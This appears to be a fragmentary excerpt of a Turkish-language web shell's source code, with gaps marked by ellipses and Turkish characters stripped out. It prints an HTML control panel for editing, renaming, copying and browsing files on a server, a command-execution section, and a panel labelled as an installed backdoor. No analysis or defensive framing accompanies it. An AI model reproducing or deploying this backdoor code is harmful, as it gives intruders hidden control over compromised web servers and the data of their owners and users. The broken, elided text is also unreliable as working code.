...
print "<td width=5% style=\"border:1px solid black\">";print "<center><b>Tr";print "</td>"; 
print "<td width=5% style=\"border:1px solid black\">";print "<center><b>Dzenleme";print "</td>";
...
$scmess3= "<center><font color=DeepSkyBlue  >Evet";}else {$scmess3= "<center><font color=red>Hayir";}if (is_dir("$nscdir/$nfiles")){$scmess4= "<font color=red><center>Klasr";}else{$scmess4= "<center><font color=DeepSkyBlue  >Dosya";} 
...
if (is_dir("$nscdir/$nfiles")){print "<b>K</b>lasr";}
...
print " <center><a href=".inclink('dlink', 'edit')."&edit=$nfiles&scdir=$nscdir>Dzenle</a>";}else {print "<center><font face=tahoma size=2 color=gray>Dzenle</center>";}print"</td>";  print "<td style=\"border:1px solid black\">";print " <center><a href=".inclink('dlink', 'ren')."&ren=$nfiles&scdir=$nscdir>Adlandir</a>";print"</td>";print "<td style=\"border:1px solid black\">";
...
}else {$cpmvmess="Kopyala/Tasimak iin Dosya Se";}
...
delm("# Komut Alistir #");print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100% height=18%>";
...
print "<center><div><b>Dosya Dzenle/Oku".$ec;print $c2.$sf."<center>";
input("text","rfile",$nscdir,53);input("hidden","scdir",$nscdir,0);print "<br>";
input("submit","","Oku-Dzenle","");print "</center>".$ef.$ec.$et."</div></td>";
print "<td><div align=center>";print $st.$c1;
print "<center><div><b>Dizin'i Gster<br>";print $ec.$c2.$sf."<center><div style='margin-top:7px'>"; input("text","scdir",$nscdir,59);print"<br>";
input("submit","","Gster","");print " ";
...
print "</center>".$ec.$ef.$et;print "</td><td height=20% width=50%><div align=right>";print $st.$c1."<div><b><center>Yklenmis Backdoor</div>";
